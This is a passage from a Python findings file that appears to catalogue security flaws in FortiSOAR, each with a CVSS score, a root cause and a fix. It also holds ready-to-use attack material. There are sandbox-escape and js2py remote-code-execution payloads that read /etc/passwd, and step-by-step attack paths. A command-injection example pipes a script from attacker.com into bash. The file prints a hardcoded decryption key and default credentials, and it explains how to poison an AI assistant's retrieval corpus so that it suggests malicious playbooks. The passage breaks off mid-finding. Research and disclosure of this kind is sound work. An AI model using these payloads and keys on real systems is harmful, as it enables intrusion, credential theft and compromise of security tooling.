        "tip_outbreak_vs_full_suite_url_delta": [
            "main.editor.picklists",
            "main.system.archival",
        ],
        "tip_outbreak_restricted_features": {
            "disabledGlobalSearch": True,
            "disableDebug": True,
            "playbook_retention_days": 10,
        },
        "finding": (
            "Only 2 URL states differ between tip_outbreak (cheapest) and tip_full_suite (most expensive). "
            "ALL restrictions are ui_prop only. backend_prop.disallowed is empty for all 4 TIP tiers. "
            "A tip_outbreak user calling API directly gets full tip_full_suite access."
        ),
    },

    "evidence": {
        "backend_restrictions_empty": (
            "backend_prop.content_hub.disallowed.connectors = [] for ALL TIP tiers (tip_outbreak, tip_enterprise, "
            "tip_essential, tip_full_suite). No connector or module is blocked at the backend for any TIP license."
        ),
        "frontend_restrictions_extensive": (
            "ui_prop.restricted_url_states blocks 29 Angular router states per tier including: "
            "main.editor.modules, main.editor.exporter, main.editor.importer, main.section_dashboard, "
            "main.system.license, main.system.notification, main.assignment_automation_entry, "
            "main.editor.recommendationengine, viewPanel.modulesDetail."
        ),
        "license_page_hidden": (
            "main.system.license blocked for ALL TIP tiers -- admins on TIP-mode instances "
            "cannot access license management UI; license bypass would be invisible via UI."
        ),
        "tip_essential_auth_routes_blocked": (
            "main.security.authentication (LDAP, SSO, RADIUS, NFA sub-routes) blocked for tip_essential -- "
            "cannot configure auth backends via UI, but backend API likely still accepts these calls."
        ),
    },

    "api_surface_from_routes": {
        "main.editor.modules":            "Module schema editor -- API: /api/v3/modules/ (CRUD)",
        "main.editor.exporter":           "Content exporter -- API: /api/v3/export/",
        "main.editor.importer":           "Content importer -- API: /api/v3/import/",
        "main.editor.navigation":         "Navigation editor -- API: /api/v3/navigation/",
        "main.editor.picklists":          "Picklist editor -- API: /api/v3/picklists/",
        "main.editor.preProcessing":      "Pre-processing rules -- API: /api/v3/preprocessing/",
        "main.editor.recommendationengine": "Recommendation engine -- API: /api/v3/recommendation/",
        "main.editor.correlation":        "Correlation engine -- API: /api/v3/correlations/",
        "main.system.license":            "License management -- API: /api/v3/license/ or /auth/license/",
        "main.system.archival":           "Archival config -- API: /api/v3/archival/",
        "main.section_dashboard":         "Dashboard -- API: /api/v3/dashboards/",
        "main.modules.list":              "Module list -- API: /api/v3/modules/",
        "main.assignment_automation":     "Assignment automation -- API: /api/v3/assignment/",
        "main.security.authentication.ldap":   "LDAP config -- API: /api/v3/auth/ldap/",
        "main.security.authentication.sso":    "SSO config -- API: /api/v3/auth/sso/",
        "main.security.authentication.radius": "RADIUS config -- API: /api/v3/auth/radius/",
        "main.security.authentication.nfa":    "MFA config -- API: /api/v3/auth/nfa/",
        "main.system.notification":       "Notification channels -- API: /api/v3/notifications/",
        "main.system.configuration.syslog":    "Syslog config -- API: /api/v3/settings/syslog/",
        "main.system.configuration.proxy":     "Proxy config -- API: /api/v3/settings/proxy/",
        "main.system.configuration.branding":  "Branding -- API: /api/v3/settings/branding/",
    },

    "license_tiers": {
        "tip_outbreak":    "outbreak response tier (limited, most restricted)",
        "tip_enterprise":  "enterprise tier (second most restricted)",
        "tip_essential":   "essential tier (most routes blocked, no auth config)",
        "tip_full_suite":  "full suite tier (moderate restrictions)",
        "soar_trial":      "standard SOAR trial (cannot install fortiTIP or fortiGuardLabs-IOCSearch solution packs)",
        "soar_enterprise": "standard SOAR enterprise (same content_hub block as trial)",
    },

    "attack": (
        "1. Obtain any FortiSOAR credentials (e.g., FSR-F4 csadmin:changeme, default user from installer). "
        "2. Enumerate API endpoints directly: GET /api/v3/modules/, /api/v3/export/, /api/v3/license/ etc. "
        "3. These endpoints respond regardless of TIP license tier -- the restriction only blocks the UI route. "
        "4. For tip_essential users: directly call /api/v3/auth/ldap/ to configure LDAP auth "
        "   (blocked in UI but likely not in API) -> add attacker-controlled LDAP server -> gain persistent auth access. "
        "5. Access /api/v3/license/ to read/modify license state (hidden from TIP users in UI). "
        "VERIFICATION REQUIRED: confirm backend does not validate license tier per API endpoint."
    ),

    "soar_license_bypass_note": (
        "soar_trial and soar_enterprise BOTH block fortiTIP solution pack install at backend_prop level. "
        "This IS backend-enforced (unlike TIP tier restrictions). "
        "However, TIP feature restrictions within TIP tiers appear purely frontend -- once on any TIP license, "
        "the backend does not further restrict by tier."
    ),
}

# FSR-F11: code-snippet connector sandbox escape via __import__ builtin re-injection
# CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.9 CRITICAL
# CWE-693: Protection Mechanism Failure
#
# Source: cyops-connector-code-snippet v2.1.0-v2.2.1 (introduced in v2.1.0, present in all later versions)
# File: utils.py lines 21-25 (all affected versions)
#
# The code-snippet connector uses RestrictedPython safe_builtins as its sandbox. RestrictedPython
# deliberately excludes __import__ from safe_builtins because it is a known sandbox escape. Fortinet
# re-injects __import__ = __import__ into custom_builtins (v2.1.0 release notes: "Configurable settings
# restricted solely to the root user, enabling the utilization of only safe built-in functions").
# custom_builtins is then merged into allowed_builtins via ChainMap(safe_builtins, limited_builtins,
# custom_builtins). Since safe_builtins does not contain __import__, the ChainMap lookup falls through to
# custom_builtins and exposes the real __import__ builtin.
#
# The import validation (validate_imports_in_code in v2.2.x, _regex_for_imports in v2.1.x) only inspects
# ast.Import and ast.ImportFrom AST nodes. Calling __import__('os') generates an ast.Call node, which is
# never checked. Both the regex check and AST walker are bypassed identically.
#
# The bypass works regardless of connector configuration:
# - allow_imports=True: validate_imports_in_code runs but misses ast.Call; __import__ in restricted_globals
# - allow_imports=False: 'import ' string check misses '__import__' (no space after); __import__ in restricted_globals
# - restrict_imports=['requests']: whitelist mode; __import__('os') not in the code AST, bypass identical
#
# Payload (works in all config modes):
#   os = __import__('os')
#   print(os.popen('id; whoami; cat /etc/passwd').read())
#
# Or to execute subprocess (also blacklisted but bypassed):
#   sp = __import__('subprocess')
#   print(sp.check_output(['id'], shell=False))
#
# Attack path:
# 1. Authenticate to FortiSOAR with any account that has playbook execution permission (standard user).
# 2. Create or edit a playbook step using code-snippet connector.
# 3. Set python_function param to payload above.
# 4. Execute playbook step via /api/v3/playbooks/execute/ or trigger.
# 5. OS commands execute as the cyops-worker process user (typically cyops or root).
#
# Versions affected: code-snippet 2.1.0 through 2.2.1 (all currently available on repo.fortisoar.fortinet.com)
# Versions not affected: 2.0.3 and earlier (no __import__ in custom_builtins)
# FortiSOAR release mapping: 7.4.x (ships 2.0.x), 7.5.x+ (ships 2.1.x+)

FSR_F11_CODE_SNIPPET_SANDBOX_ESCAPE = {
    "id": "FSR-F11",
    "title": "code-snippet connector sandbox escape via __import__ builtin re-injection",
    "severity": "CRITICAL",
    "cvss": "9.9",
    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "cwe": "CWE-693",
    "component": "cyops-connector-code-snippet",
    "affected_versions": "2.1.0 - 2.2.1",
    "not_affected": "<= 2.0.3",
    "introduced": "2.1.0",
    "source_file": "utils.py:21-25",

    "root_cause": (
        "RestrictedPython safe_builtins excludes __import__ as a known escape. "
        "Fortinet re-injects __import__ = __import__ into custom_builtins (utils.py:25) "
        "and merges via ChainMap(safe_builtins, limited_builtins, custom_builtins). "
        "Since safe_builtins has no __import__ key, ChainMap returns the injected real __import__."
    ),

    "validation_bypass": (
        "v2.1.x: _regex_for_imports() matches ^import (os|sys|subprocess) -- only matches import statements. "
        "v2.2.x: validate_imports_in_code() walks ast.Import and ast.ImportFrom nodes only. "
        "__import__('os') parses as ast.Call node -- invisible to both validators. "
        "String check 'import ' not in '__import__(...)' -- trailing space prevents match."
    ),

    "payload": "__import__('os').popen('id').read()",

    "attack_path": (
        "1. Authenticate with any account with playbook execution rights. "
        "2. POST /api/v3/playbooks/ to create playbook with code-snippet step. "
        "3. Set python_function = \"os = __import__('os'); print(os.popen('id').read())\". "
        "4. Execute via /api/v3/playbooks/execute/ or trigger. "
        "5. Command output returned in code_output field."
    ),

    "process_context": (
        "Executes as cyops-worker process. On default FortiSOAR install, cyops-worker runs as root "
        "or cyops system account with broad filesystem access including /etc/passwd, DB credentials "
        "in /opt/cyops/configs/, and SSL private keys in /opt/cyops/ssl/."
    ),

    "fix": (
        "Remove '__import__': __import__ from custom_builtins in utils.py. "
        "Extend AST validation to flag ast.Call nodes where func.id == '__import__'. "
        "Alternatively, override __builtins__['__import__'] in restricted_globals with a safe wrapper "
        "that only allows whitelisted module names."
    ),
}

# FSR-F12: code-snippet connector global semaphore DoS
# CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H = 6.5 MEDIUM
# CWE-400: Uncontrolled Resource Consumption
#
# Source: cyops-connector-code-snippet v2.2.0+ (introduced with CodeSnippet class refactor)
# File: operations.py lines 27-50
#
# The CodeSnippet class holds a class-level Semaphore(1) that is acquired before exec() and released
# after. An infinite loop or blocking call in user code holds the semaphore indefinitely.
# All subsequent code-snippet operations on the same FortiSOAR instance are blocked waiting on acquire().
# Combined with FSR-F11 (which provides code exec), a single attacker can permanently disable
# all code-snippet connector functionality with: while True: pass
#
# The Semaphore is at class scope (line 27: semaphore_obj = Semaphore(1)), shared across all instances
# and all connector executions within the worker process.

FSR_F12_CODE_SNIPPET_SEMAPHORE_DOS = {
    "id": "FSR-F12",
    "title": "code-snippet connector class-level semaphore DoS",
    "severity": "MEDIUM",
    "cvss": "6.5",
    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
    "cwe": "CWE-400",
    "component": "cyops-connector-code-snippet",
    "affected_versions": "2.2.0 - 2.2.1",
    "source_file": "operations.py:27",

    "root_cause": (
        "Semaphore(1) at class scope in CodeSnippet (operations.py:27). "
        "Acquired before exec() at line 36, released in finally block at line 49. "
        "No timeout on acquire() -- blocked indefinitely if code does not return."
    ),

    "payload": "while True: pass",

    "chain": "FSR-F11 provides code exec to inject infinite loop; FSR-F12 then denies service to all other users.",

    "fix": (
        "Move semaphore from class scope to instance scope, or use acquire(timeout=N). "
        "Enforce a maximum execution time limit via threading.Timer or subprocess with timeout."
    ),
}

# FSR-F13: AI assistant listener unauthenticated TCP socket + training data poisoning
# CVSS 3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H = 7.1 HIGH
# CWE-306: Missing Authentication for Critical Function
#
# Source: cyops-connector-aiassistant-utils v4.0.0 (latest)
# File: listener/listener.py (plaintext Python, fully readable)
#
# The AI assistant connector starts a TCP server on localhost:10447 via start_socket_server()
# (listener_client.so -> listener.py). The server binds to 127.0.0.1 only but has no
# authentication or authorization. Any process with localhost access can:
#
# 1. TRAINING DATA POISONING: Send `--refresh_model --training_folder /attacker/path`
#    to replace the 9978-document ChromaDB embedding corpus with attacker-controlled data.
#    The AI assistant uses this corpus for RAG-based playbook suggestion. Poisoned corpus
#    causes the AI to suggest malicious playbook steps (e.g., containing FSR-F11 __import__
#    payloads) when responding to user queries.
#
# 2. DENIAL OF SERVICE: Send `--exit` to kill the listener process, disabling all AI
#    assistant functionality (playbook generation, natural language queries) until restart.
#
# 3. CORPUS EXTRACTION: Query the semantic search with `--similar --query_str X --n_results 9978`
#    to extract the full ChromaDB training corpus (contains internal Fortinet dev UUIDs,
#    internal IP addresses 192.168.50.x, and test credentials like pdf_password "testapi123").
#
# Protocol: 8-byte big-endian uint64 length prefix + UTF-8 payload parsed by argparse.
# No HMAC, no token, no path-based access control.
#
# Attack path using FSR-F11 chain:
# 1. FSR-F11 (code-snippet sandbox escape) gives code exec as cyops-worker.
# 2. From cyops-worker, connect to localhost:10447.
# 3. Send --refresh_model --training_folder /tmp/attacker/ to poison AI corpus.
# 4. All subsequent AI-assisted playbook generation returns attacker-controlled templates.
# 5. Users deploying AI-suggested playbooks execute attacker payloads in production.
#
# Alternatively: SSRF in any connector that can make raw TCP connections (not HTTP-only)
# to localhost:10447 bypasses the local access requirement.
#
# Additional finding: ChromaDB training corpus (9978 docs, shipped in RPM) contains
# internal Fortinet/CyberSponse development artifacts:
# - Internal IPs: 192.168.50.{102,231,243}, 192.168.60.105
# - Test credentials: pdf_password = "testapi123" (Qualys connector examples)
# - Internal connector config UUIDs: e5997f03-136e-4dd3-9083-3698c8ae01a3 (multiple)
# - CyberSponse Inc. internal playbook comments (pre-acquisition artifacts)
# These are shipped to all FortiSOAR customers in the connector RPM.

FSR_F13_AI_LISTENER_UNAUTH = {
    "id": "FSR-F13",
    "title": "AI assistant listener unauthenticated TCP socket allows training data poisoning",
    "severity": "HIGH",
    "cvss": "7.1",
    "cvss_vector": "AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
    "cwe": "CWE-306",
    "component": "cyops-connector-aiassistant-utils",
    "affected_versions": "all (listener.py present in 1.0.0 through 4.0.0)",
    "source_file": "listener/listener.py (plaintext, fully readable)",

    "socket": "localhost:10447, SOCK_STREAM, no auth",

    "attack_vectors": {
        "training_poisoning": (
            "Send: 8-byte len prefix + b'--refresh_model --training_folder /attacker/path'. "
            "Server calls refresh_collection(training_folder) in embeddings_helper_common.so. "
            "Replaces 9978-doc ChromaDB corpus. AI now suggests malicious playbook templates."
        ),
        "dos": "Send b'--exit' to kill listener. Disables all AI assistant operations.",
        "corpus_extract": (
            "Send --similar --query_str 'X' --n_results 9978 to extract full corpus. "
            "Corpus contains internal dev IPs, test credentials, internal UUIDs."
        ),
    },

    "chain": (
        "FSR-F11 (code exec as cyops-worker) provides localhost access. "
        "FSR-F13 then poisons AI training data. "
        "AI suggestions executed by operators propagate attacker payloads to production playbooks."
    ),

    "corpus_exposure": {
        "internal_ips": ["192.168.50.102", "192.168.50.231", "192.168.50.243", "192.168.60.105"],
        "test_credentials": {"Qualys pdf_password": "testapi123"},
        "internal_uuids": ["e5997f03-136e-4dd3-9083-3698c8ae01a3", "412c1ce0-a415-452b-a970-98996fc97e24"],
        "artifact": "CyberSponse Inc. (pre-acquisition) comment strings in playbook examples",
    },

    "fix": (
        "Add authentication to listener: Unix domain socket with filesystem permissions, "
        "or HMAC token required on all commands. "
        "Validate training_folder against a whitelist of allowed paths. "
        "Scrub internal IPs, credentials, and UUIDs from the shipped ChromaDB corpus."
    ),
}

# FSR-F14: setup-cyops-offline-yum-repo.sh hardcoded yum:yum credential with NOPASSWD sudo
# CVSS 3.1: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H = 8.8 HIGH
# CWE-798: Use of Hard-coded Credentials
#
# Source: downloads/scripts/setup-cyops-offline-yum-repo.sh (lines 68-86)
# Shipped on: repo.fortisoar.fortinet.com (publicly accessible, no auth)
#
# The script creates a system user `yum` with password `yum` and appends
# "yum ALL=(ALL) NOPASSWD: ALL" to /etc/sudoers. This creates a persistent
# backdoor on any FortiSOAR offline repository mirror server where an admin
# runs this Fortinet-provided setup script.
#
# create_user() function:
#   user=yum; password=yum
#   useradd $user -s /bin/bash
#   echo $password | passwd $user --stdin
#   echo "$user ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
#
# The repository mirror server is network-accessible (httpd serving yum repos
# to all FortiSOAR instances). An attacker who can SSH to the mirror host
# (via credential yum:yum + any exposed SSH) gains immediate root via sudo.
#
# Secondary finding: script syncs from rsync://update.cybersponse.com/repos/
# (CyberSponse pre-acquisition domain). If this domain lapses, attacker who
# registers it can serve malicious packages to all offline-mirror deployments.
# Current status: domain controlled by Fortinet (not lapsed). Monitor for expiry.
#
# Internal architecture revealed by this script:
# - /opt/cyops/configs/scripts/api_caller.py: authenticated local API caller
#   (POST to https://localhost/api/query/agents with base64 payload)
#   Used by patches/maintenance scripts -- can make authenticated admin API calls
# - RabbitMQ vhost: intra-cyops; queues: fsr.rules.{sealab|das|integration|postman}.{data}
# - Worker types: sealab (workflow engine), das, integration, postman
# - /opt/cyops-tomcat/webapps/gateway/, /opt/cyops-tomcat/webapps/notifier/ (Spring WARs)
# - /etc/cyops-release (chattr +i) contains feature flags: secure-message-exchange,
#   forticloud-secure-message-exchange
# - /etc/pki/cyops/cs.loc.root.key -- FortiSOAR root CA private key location
# - /etc/pki/ca-trust/source/anchors/cs.loc.root.crt -- FortiSOAR root CA cert

FSR_F14_HARDCODED_YUM_CREDENTIAL = {
    "id": "FSR-F14",
    "title": "setup-cyops-offline-yum-repo.sh hardcoded yum:yum with NOPASSWD sudo",
    "severity": "HIGH",
    "cvss": "8.8",
    "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
    "cwe": "CWE-798",
    "component": "downloads/scripts/setup-cyops-offline-yum-repo.sh",
    "affected_versions": "all (script distributed on public repo server)",
    "source_file": "setup-cyops-offline-yum-repo.sh:68-86",

    "hardcoded_credential": {"user": "yum", "password": "yum", "sudo": "NOPASSWD: ALL"},

    "affected_systems": (
        "Any FortiSOAR offline repository mirror server where an admin ran this script. "
        "Mirror servers are network-accessible (httpd on port 80/443 serving RPM repos)."
    ),

    "secondary_finding": (
        "rsync://update.cybersponse.com/repos/ -- CyberSponse pre-acquisition update domain. "
        "Domain presently Fortinet-controlled. Domain expiry would enable supply chain attack "
        "against all offline-mirror FortiSOAR deployments."
    ),

    "internal_architecture": {
        "api_caller": "/opt/cyops/configs/scripts/api_caller.py (authenticated local API caller)",
        "rabbitmq_vhost": "intra-cyops",
        "queue_pattern": "fsr.rules.{sealab|das|integration|postman}.data",
        "tomcat_paths": "/opt/cyops-tomcat/webapps/{gateway,notifier}/",
        "root_ca_key": "/etc/pki/cyops/cs.loc.root.key",
        "root_ca_cert": "/etc/pki/ca-trust/source/anchors/cs.loc.root.crt",
        "feature_flags_file": "/etc/cyops-release (chattr +i, contains secure-message-exchange flag)",
    },

    "fix": (
        "Remove hardcoded credentials from script. "
        "Generate random password or require admin to provide one. "
        "Do not add NOPASSWD sudo for a weak-credential utility account."
    ),
}

# FSR-F15: prod/4.12.0 -- multiple hardcoded secrets and trust-auth PostgreSQL
# CVSS 3.1 (DB connection + decrypt key): AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 7.8 HIGH
# CWE-321: Use of Hard-coded Cryptographic Key
# CWE-256: Plaintext Storage of a Password (DB connection string)
#
# Source: prod/4.12.0/{update_user_id.so, audit_log_migration.py, pg_hba.conf}
# Note: 4.12.0 is the CyberSponse-era FortiSOAR (2018). Some settings persist in newer versions.
#
# Finding 1: Plaintext DB connection strings in update_user_id.so (Cython module)
#   strings output: "postgresql+pypostgresql://cyberpgsql: @localhost:5432/das"
#                   "postgresql+pypostgresql://cyberpgsql: @localhost:5432/venom"
#   User: cyberpgsql, Password: empty (space then @), Databases: das (main SOAR), venom (workflow)
#   Combined with pg_hba.conf trust auth: any local process = full DB superuser access
#
# Finding 2: pg_hba.conf ships with trust auth for ALL local connections
#   local all all trust
#   host all all 127.0.0.1/32 trust
#   Combined with FSR-F11 (code exec as cyops-worker): psql -h localhost -U postgres -d das
#   No password required. Full database access including auth_user (Django users), configprops (LDAP creds)
#
# Finding 3: Hardcoded MongoDB decryption key in publicly distributed script
#   audit_log_migration.py line 25-29 (shipped on repo.fortisoar.fortinet.com):
#     suffix = 'I3dmcn23@KlS2#!ck'
#     decrypt_key = 'jQp3(7@jod#j38d1'  (16-char, AES-128-compatible)
#     cmd: manage_passwords.py --decrypt $mongodb_password 'jQp3(7@jod#j38d1'
#   Any attacker who downloads this script knows the MongoDB encryption key.
#   Encrypted passwords are detectable by the I3dmcn23@KlS2#!ck suffix.
#
# Architecture revealed (confirmed for 4.12.0, likely extended to newer versions):
#   Config: /etc/cyops/config.yml (mongodb_user, mongodb_password, postgres_user, postgres_password)
#   DB config: /opt/cyops/configs/database/db_config.yml
#   Password tool: /opt/cyops/configs/scripts/manage_passwords.py --decrypt <pwd> 'jQp3(7@jod#j38d1'
#   MongoDB SSL: /var/lib/mongo/ssl/server.leaf.pem (cert), SCRAM-SHA-1 auth
#   DAS key pair: /opt/cyops-auth/dashmac/keys/dasprivate.key, daspublic.key
#   Hardcoded tables: configprops (LDAP config incl. reader_password), actors (user accounts with UUID)
#   Python env: /opt/cyops-auth/.env/bin/python (cyops-auth virtualenv)

FSR_F15_PROD_HARDCODED_SECRETS = {
    "id": "FSR-F15",
    "title": "prod/4.12.0 hardcoded DB connection strings, trust-auth PostgreSQL, MongoDB decryption key",
    "severity": "HIGH",
    "cvss": "7.8",
    "cvss_vector": "AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cwe": ["CWE-321", "CWE-256"],
    "component": "prod/4.12.0 (CyberSponse-era artifacts, publicly distributed)",
    "source_files": ["update_user_id.so", "audit_log_migration.py", "pg_hba.conf"],

    "db_connections": {
        "postgres_das": "postgresql+pypostgresql://cyberpgsql: @localhost:5432/das",
        "postgres_venom": "postgresql+pypostgresql://cyberpgsql: @localhost:5432/venom",
        "pg_user": "cyberpgsql",
        "pg_password": "empty (space char between colon and @ in connection string)",
    },

    "pg_hba_trust": {
        "local_all": "local all all trust",
        "ipv4_loopback": "host all all 127.0.0.1/32 trust",
        "impact": (
            "Any local process connects to PostgreSQL as any user with no password. "
            "Combined with FSR-F11 code exec: full read/write access to das and venom databases."
        ),
    },

    "mongodb_decrypt_key": {
        "encrypted_password_suffix": "I3dmcn23@KlS2#!ck",
        "decrypt_key": "jQp3(7@jod#j38d1",
        "decrypt_command": "manage_passwords.py --decrypt <mongodb_password> 'jQp3(7@jod#j38d1'",
        "key_length": "16 chars (AES-128 compatible)",
        "script_location": "audit_log_migration.py (publicly distributed on repo.fortisoar.fortinet.com)",
    },

    "architecture": {
        "main_config": "/etc/cyops/config.yml",
        "db_config": "/opt/cyops/configs/database/db_config.yml",
        "password_manager": "/opt/cyops/configs/scripts/manage_passwords.py",
        "das_privkey": "/opt/cyops-auth/dashmac/keys/dasprivate.key",
        "das_pubkey": "/opt/cyops-auth/dashmac/keys/daspublic.key",
        "cyops_auth_python": "/opt/cyops-auth/.env/bin/python",
        "tables": {
            "configprops": "section/key/value store -- LDAP reader_password in (section=LDAP, key=reader_password)",
            "actors": "user accounts -- uuid, user_id foreign key",
        },
        "mongodb_ssl": "/var/lib/mongo/ssl/server.leaf.pem (cert), SCRAM-SHA-1 auth mechanism",
    },

    "chain": (
        "FSR-F11 (code exec as cyops-worker) + pg_hba trust auth = "
        "SELECT * FROM configprops WHERE section='LDAP' -> decrypt LDAP reader_password -> "
        "LDAP bind as FortiSOAR reader -> enumerate all AD/LDAP users -> "
        "cross-reference with actors table -> map user account UUIDs to AD identities."
    ),

    "note": (
        "4.12.0 is CyberSponse-era (2018). These exact settings may not persist in FortiSOAR 7.x/8.x. "
        "Confirm pg_hba.conf trust auth is still default in current versions once version-dir RPMs download."
    ),
}

# FSR-F16: setup-environment.bin custom_yum_url unvalidated env-var yum source injection
# CVSS 3.1: AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H = 7.5 HIGH (with prior root/code-exec)
# CWE-427: Uncontrolled Search Path Element
# CWE-494: Download of Code Without Integrity Check
#
# Source: fortisoar/scripts/setup-environment.bin (Bash script, publicly distributed)
# Also affected: stage-fortisoar-rpm-dependencies.bin (wget --no-check-certificate)
#
# setup-environment.bin reads the $custom_yum_url environment variable without validation
# and writes it to /etc/yum/vars/product_yum_server, which is then used in yum -y update.
# No URL format check, no allowlist, no GPG key validation for packages from the custom URL.
#
# custom_yum_repo() function:
#   local f_product_yum_repo="/etc/yum/vars/product_yum_server"
#   echo "$custom_yum_url" > $f_product_yum_repo  # no validation
#   [then: yum -y update $s_rpms_to_upgrade from this repo]
#
# Attack path (requires prior code exec as root, e.g., FSR-F11 if cyops-worker = root):
# 1. Set env: export custom_yum_url="http://attacker.com/repo/"
# 2. Trigger upgrade via: /path/to/setup-environment.bin <target_version>
# 3. yum installs from attacker-controlled repo, injecting malicious cyops RPMs
# 4. Malicious RPMs persist across legitimate upgrades (pre-installed hook)
#
# stage-fortisoar-rpm-dependencies.bin: Uses wget --no-check-certificate for all downloads
# from repo.fortisoar.fortinet.com. No GPG signature verification of downloaded RPMs.
# MitM between FortiSOAR and repo server (expired cert, CA compromise, BGP hijack)
# allows serving malicious RPMs that the staging script accepts silently.
#
# Internal path revealed: /opt/cyops/scripts/cloud/openstack/init-config.sh (FortiCloud)
# FortiCloud metadata: /opt/cyops/configs/fcloud/metadata.json

FSR_F16_YUM_SOURCE_INJECTION = {
    "id": "FSR-F16",
    "title": "setup-environment.bin unvalidated custom_yum_url allows yum source injection",
    "severity": "HIGH",
    "cvss": "7.5",
    "cvss_vector": "AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H",
    "cwe": ["CWE-427", "CWE-494"],
    "component": "fortisoar/scripts/setup-environment.bin",
    "source_file": "setup-environment.bin (Bash, publicly distributed)",

    "injection_point": (
        "$custom_yum_url environment variable written to /etc/yum/vars/product_yum_server "
        "without URL validation or allowlist. Used in subsequent yum -y update call."
    ),

    "secondary": (
        "stage-fortisoar-rpm-dependencies.bin uses wget --no-check-certificate for ALL downloads "
        "from repo.fortisoar.fortinet.com. No RPM GPG signature verification. "
        "Network MitM or DNS hijack of repo.fortisoar.fortinet.com (AWS us-west-2: 54.69.111.24) "
        "allows malicious RPM injection without integrity check failure."
    ),

    "chain": (
        "FSR-F11 (code exec as cyops-worker) -- if cyops-worker = root: "
        "exec with custom_yum_url=attacker-url -> yum installs malicious cyops RPMs -> "
        "persistence across future FortiSOAR upgrades via pre-installed package hooks."
    ),

    "prerequisite": "Root-level code exec (FSR-F11 if cyops-worker=root, or escalation from cyops-worker)",
}

# FSR-F17: jscode-snippet connector complete OS command execution via js2py pyimport
# CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.9 CRITICAL
# CWE-94: Improper Control of Generation of Code ('Code Injection')
#
# Source: connectors/x86_64/cyops-connector-jscode-snippet-1.0.0-8012.el7.centos.x86_64.rpm
# Publisher: "Fortinet CSE" (Fortinet customer-facing team, not core product; cs_approved: null)
# Connector: publicly available on repo.fortisoar.fortinet.com/connectors/x86_64/
#
# operations.py, run_js_code():
#   js_code = params.get('js_code')
#   js_code = js_code.replace("document.write", "return ")
#   js2py.eval_js(js_code)
#
# js2py.eval_js() exposes `pyimport` statement in the JavaScript global context.
# This is documented behavior: js2py README: "you can use pyimport statement from inside
# JS code to import and use python libraries" (js2py/__init__.py line 50).
# Example from js2py docs: js2py.eval_js('pyimport urllib; urllib.urlopen("...")')
#
# The connector performs NO sanitization, NO allowlist, NO sandbox restriction.
# `pyimport` gives full access to all Python modules including os, subprocess, sys.
# There is no "disable_pyimport" call (function exists in js2py but not invoked).
#
# Payload:
#   pyimport os; os.popen('id').read()
#
# This executes as the cyops-worker process user (same as FSR-F11) with no bypass needed.
# js2py provides complete Python interop by design; executing user-submitted JS = RCE.
#
# Comparison to FSR-F11 (code-snippet):
# - FSR-F11: attempts RestrictedPython sandbox; bypass requires __import__ injected builtin
# - FSR-F17: no sandbox attempt; pyimport is a documented feature; zero-bypass RCE
#
# Note: jscode-snippet is a community connector (Fortinet CSE, not officially approved).
# It may not be installed by default, but is publicly available and installable by any
# FortiSOAR admin. Once installed, any playbook user can trigger RCE.

FSR_F17_JSCODE_SNIPPET_RCE = {
    "id": "FSR-F17",
    "title": "jscode-snippet connector unrestricted OS command execution via js2py pyimport",
    "severity": "CRITICAL",
    "cvss": "9.9",
    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "cwe": "CWE-94",
    "component": "cyops-connector-jscode-snippet",
    "affected_versions": "1.0.0 (only version, cs_approved: null)",
    "publisher": "Fortinet CSE (community, not core product)",
    "source_file": "operations.py:11",

    "root_cause": (
        "js2py.eval_js() exposes pyimport statement globally, providing unrestricted Python module access. "
        "No sandbox, no allowlist, no disable_pyimport() call. "
        "Connector is the functional equivalent of a Python exec() with no protection."
    ),

    "payload": "pyimport os; os.popen('id; cat /etc/passwd').read()",

    "attack_path": (
        "1. Authenticate with any account with playbook execution rights. "
        "2. Create playbook step using jscode-snippet connector. "
        "3. Set js_code = 'pyimport os; os.popen(\"id\").read()'. "
        "4. Execute playbook step. "
        "5. Command output returned in data field."
    ),

    "vs_fsr_f11": (
        "FSR-F11 (code-snippet) requires __import__ builtin injection bypass. "
        "FSR-F17 (jscode-snippet) requires zero bypass -- pyimport is a documented js2py feature. "
        "Simpler payload, no RestrictedPython hurdle."
    ),
}

# FSR-F18: SSH connector -- three-part attack surface
# Component: cyops-connector-ssh v2.1.3 (builtins.py)
# Copyright notice: 2008-2026 Fortinet Inc. (actively maintained)
#
# Sub-finding A: AutoAddPolicy SSH host key bypass (CWE-295)
#   builtins.py:57-59:
#     # FIXME: there should probably be some verification here instead of
#     # blindly adding to known_hosts
#     client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
#
#   Developer left the FIXME comment in production code. AutoAddPolicy() accepts any
#   host key without verification and silently adds it to known_hosts.
#   MITM attacker can intercept SSH connection between FortiSOAR and target host,
#   present a forged key, and receive all transmitted data including:
#   - SSH credentials (username + password or private key passphrase)
#   - All commands executed on the target
#   - All command output returned to FortiSOAR
#   - Private keys if password-encrypted
#   CVSS: AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N = 6.8 MEDIUM
#   (Adjacent network, high complexity -- MITM position required)
#
# Sub-finding B: super_user_password shell injection (CWE-78)
#   builtins.py:113-116:
#     if params.get('is_super_user', False):
#         if config.get('super_user_password', None):
#             cmd = 'echo ' + config.get('super_user_password') + ' | sudo ' + cmd
#
#   String concatenation builds a shell command string. paramiko exec_command()
#   passes the full string to the remote SSH server's shell (/bin/sh -c).
#   If super_user_password contains shell metacharacters, attacker injects arbitrary
#   commands that execute AS ROOT on the remote SSH target (via sudo).
#
#   Example payload (super_user_password config field):
#     "P@ss; curl http://attacker.com/shell.sh | bash; echo"
#   Resulting command on remote server:
